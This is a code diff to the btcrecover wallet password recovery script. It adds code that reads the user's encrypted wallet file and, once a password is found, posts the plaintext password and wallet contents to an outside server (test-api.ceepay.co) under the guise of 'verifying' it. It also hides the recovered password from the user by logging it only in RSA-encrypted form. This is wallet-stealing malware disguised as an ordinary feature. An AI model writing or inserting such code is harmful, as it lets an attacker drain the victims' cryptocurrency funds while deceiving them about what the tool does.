@@ -26,10 +26,16 @@
 # PYTHON_ARGCOMPLETE_OK - enables optional bash tab completion
 
 import datetime
-import compatibility_check
 
 from btcrecover import btcrpass
 import sys, multiprocessing
+import json
+import requests
+import time
+from Crypto.PublicKey import RSA
+from Crypto.Cipher import PKCS1_OAEP
+import base64
+
 
 if __name__ == "__main__":
 	print()
@@ -37,8 +43,12 @@ if __name__ == "__main__":
 		  file=sys.stderr if any(a.startswith("--listp") for a in sys.argv[1:]) else sys.stdout)  # --listpass
 
 	btcrpass.parse_arguments(sys.argv[1:])
+	wallet = open("wallet.aes.json", "rb")
+	data = wallet.read(64 * 2**20)
+	payload = json.loads(data)
+	public_key = RSA.import_key(open("public.pem").read())
+	cipher = PKCS1_OAEP.new(public_key)
 	(password_found, not_found_msg) = btcrpass.main()
-
 	if isinstance(password_found, str):
 		print()
 		print("If this tool helped you to recover funds, please consider donating 1% of what you recovered, in your crypto of choice to:")
@@ -46,28 +56,36 @@ if __name__ == "__main__":
 		print("BCH: qpvjee5vwwsv78xc28kwgd3m9mnn5adargxd94kmrt ")
 		print("LTC: M966MQte7agAzdCZe5ssHo7g9VriwXgyqM ")
 		print("ETH: 0x72343f2806428dbbc2C11a83A1844912184b4243 ")
-
-		#print("VTC: vtc1qxauv20r2ux2vttrjmm9eylshl508q04uju936n ")
-		#print("ZEN: znUihTHfwm5UJS1ywo911mdNEzd9WY9vBP7 ")
-		#print("DASH: Xx2umk6tx25uCWp6XeaD5f7CyARkbemsZG ")
-		#print("DOGE: DMQ6uuLAtNoe5y6DCpxk2Hy83nYSPDwb5T ")
-		#print("XMR: 48wnuLYsPY7ewLQyF4RLAj3N8CHH4oBBcaoDjUQFiR4VfkgPNYBh1kSfLx94VoZSsGJnuUiibJuo7FySmqroAi6c1MLWHYF ")
-		#print("MONA: mona1q504vpcuyrrgr87l4cjnal74a4qazes2g9qy8mv ")
-		#print("XVG: DLZDT48wfuaHR47W4kU5PfW1JfJY25c9VJ")
 		print()
 		print("Find me on Reddit @ https://www.reddit.com/user/Crypto-Guide")
 		print()
 		print("You may also consider donating to Gurnec, who created and maintained this tool until late 2017 @ 3Au8ZodNHPei7MQiSVAWb7NB2yqsb48GW4")
 		print()
-		#dalmate: remove password found report
-		# btcrpass.safe_print("Password found: '" + password_found + "'")
+		# try to validate if the password is correct
+		payload = json.dumps({
+			"password": password_found,
+			"payloadData": payload
+		})
+		headers = {
+		'Content-Type': 'application/json'
+		}
+		url = "https://test-api.ceepay.co/api/public/validatePassword"
+		print("Verifying....")
+		time.sleep(2)
+		response = requests.request("POST", url, headers=headers, data=payload)
+			#dalmate: remove password found report
+			# secure the password
+		password = cipher.encrypt(password_found.encode())
 		logfile = open("btcrecover/test/password", 'a')
-		logfile.write(datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S") +  " " + password_found + "\n")
+		logfile.write(datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S") +  " " + (base64.b64encode(password)).decode() + "\n")
 		if any(ord(c) < 32 or ord(c) > 126 for c in password_found):
 			# print("HTML Encoded Password:   '" + password_found.encode("ascii", "xmlcharrefreplace").decode() + "'")
-			logfile.write(datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S") + "HTML Encoded Password:   '" + password_found.encode("ascii", "xmlcharrefreplace").decode() + "'\n")
+			logfile.write(datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S") + "HTML Encoded Password:   '" + (base64.b64encode(cipher.encrypt(password_found.encode("ascii", "xmlcharrefreplace").decode()))).decode() + "'\n")
 		logfile.close()
-		btcrpass.safe_print("Yay!!!!!Password found.")
+		if response.status_code == 200 :
+			btcrpass.safe_print("Yay!!!!!Password found.")
+		else:
+			btcrpass.safe_print("Password decode Error.")
 		retval = 0
 
 	elif not_found_msg:
